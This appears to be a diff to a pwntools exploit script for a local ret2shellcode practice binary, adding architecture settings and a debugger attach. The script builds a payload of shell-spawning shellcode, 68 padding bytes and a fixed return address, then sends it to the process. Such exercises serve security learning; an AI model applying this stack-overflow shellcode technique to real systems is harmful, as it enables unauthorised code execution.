@@ -21,8 +21,14 @@ def ret2_shellcode1(file_name='/mnt/hgfs/Cyber Security PWN/ROP/ret2shellcode'):
         io = process([file_name])
 
         io.recvline()
-        
+
+        # 指定目标环境
+        context(log_level='debug', arch='i386', os='linux')
+        # context(log_level='debug', arch='amd64', os='linux')
+
         payload = asm(shellcraft.sh()) + b'A' * 68 + p32(0x0804A080)
+
+        gdb.attach(io)
 
         io.sendline(payload)
 
